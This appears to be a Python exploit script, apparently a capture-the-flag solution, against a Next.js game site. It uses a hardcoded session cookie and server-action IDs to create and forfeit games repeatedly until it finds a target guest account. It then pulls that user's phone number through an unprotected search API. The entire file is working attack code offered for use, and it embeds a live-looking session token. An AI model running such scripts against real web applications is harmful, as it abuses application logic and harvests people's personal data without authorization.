import requests
import json
import time
import re

BASE_URL = "http://worker01.flag4jobs.live:14746"
COOKIE = (
    "authjs.csrf-token=6d118d9a09fe8181f8311884bf9eb5fbc4f99ee2f3186155a20b61527a659711%7C3765792a8085b9d612688d0339f7851e61c88d605bd9287f597f7881946c1d61; authjs.callback-url=http%3A%2F%2Fworker01.flag4jobs.live%3A14746%2Flogin; authjs.session-token=eyJhbGciOiJkaXIiLCJlbmMiOiJBMjU2Q0JDLUhTNTEyIiwia2lkIjoiaGpFN3hpNXRob1hFTkVBOG9NVlRfb3ZlX2FwTDVoMkZhVDFiVm1GaDR3MTJyY2tsN2pIc2RVeGpTMlFrbEN6bkJoYndZb3hUUUVacEpwMjZzbjVmQlEifQ..QT69sjh0kMfO2grB6k9C2w.X4mitTTrK-WR3lZo17E4a4X4oY9_IR2nmsrEMnBpEwCoGTqhocjEVd_YJoLdl2jAT1uMVJCQu7eufTb7KJTVFbbNUQZRB2xYIjxPQ68ff32q9gMLlJd1q2BLmVrzrVWxoDvQlMpLHj-Zopd900q2sLE6_3dtCLrdWeeiTsx5Rrp09M9s_Myc7os8CL54sw1gg-2HZwNxld26eMKC03QDL3SO-mQ1wfnVurAtE4ngfvJvl-Js1nnEjz2KO0NuXNmnHo73o_BZav5HDmUuPXAa8Q.bggyjkF9UJHo9pVY84B7jhn3Z-kp8NiTtfWhx2REMts"
)

CREATE  = "9bf4f27fd98f538836ea136469ace3fc10b4737c"
PLAY    = "3a846f28c517189f8c1cdd053073cfb5655b5766"
GETGAME = "2ba93e554113cdd4cfa2ae838a76283a7b03870e"

ROUTER_STATE = (
    "%5B%22%22%2C%7B%22children%22%3A%5B%22play%22%2C%7B%22children%22%3A"
    "%5B%22__PAGE__%22%2C%7B%7D%2C%22%2Fplay%22%2C%22refresh%22%5D%7D%5D"
    "%7D%2Cnull%2Cnull%2Ctrue%5D"
)

session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Cookie": COOKIE,
    "Origin": BASE_URL,
    "Referer": BASE_URL + "/play",
    "Accept": "text/x-component",
    "Content-Type": "text/plain;charset=UTF-8",
    "Next-Router-State-Tree": ROUTER_STATE,
})

def action(action_id, body):
    r = session.post(BASE_URL + "/play", headers={
        "Next-Action": action_id,
    }, data=json.dumps(body), timeout=10)
    print(f"  [{action_id[:8]}] HTTP {r.status_code} | {r.text[:120]}")
    # Cherche toutes les lignes 1:
    matches = re.findall(r'\n1:(.+)', r.text)
    for m in matches:
        try:
            parsed = json.loads(m)
            return parsed
        except:
            continue
    return None

def get_new_game_id():
    """Récupère le dernier ID créé via le RSC"""
    r = session.get(BASE_URL + "/play", headers={
        "Accept": "*/*",
        "RSC": "1",
        "Next-Router-State-Tree": ROUTER_STATE,
    }, timeout=10)
    # Trouve toutes les paires id/guestEmail
    pairs = re.findall(r'"id":"([a-f0-9-]{36})","hostEmail":"[^"]+","guestEmail":"([^"]+)","winner":null', r.text)
    return pairs  # Seulement les parties sans winner (actives)

def forfeit(game_id):
    # Requête 1 : forfeit
    action(PLAY, [{"gameId": game_id, "option": "forfeit"}])
    time.sleep(0.3)
    # Requête 2 : getGame (refresh)
    action(GETGAME, [game_id])

def get_phone(email):
    r = session.get(f"{BASE_URL}/api/search/{email}", timeout=10)
    data = r.json()
    return data[0].get("phone") if data else None

def hunt():
    attempt = 0
    known_ids = set()

    while True:
        attempt += 1
        print(f"\n--- Tentative {attempt} ---")

        # Parties actives avant création
        before = set(id for id, _ in get_new_game_id())

        # Créer une partie
        r = action(CREATE, [None])
        if r and "too many games" in str(r):
            print("  Limite atteinte, forfeit des actives...")
            for game_id, guest in get_new_game_id():
                if game_id not in known_ids:
                    forfeit(game_id)
            time.sleep(0.5)
            continue

        time.sleep(0.5)

        # Parties actives après création
        after = get_new_game_id()
        new_games = [(id, guest) for id, guest in after if id not in before]

        if not new_games:
            print("  Pas de nouvelle partie détectée")
            continue

        game_id, guest = new_games[0]
        known_ids.add(game_id)
        print(f"  Nouvelle partie: {guest} ({game_id[:8]}...)")

        if "glitch" in guest:
            print(f"FOUND! {guest}")
            phone = get_phone(guest)
            print(f"Phone: {phone}")
            break

        forfeit(game_id)
        time.sleep(0.4)


hunt()
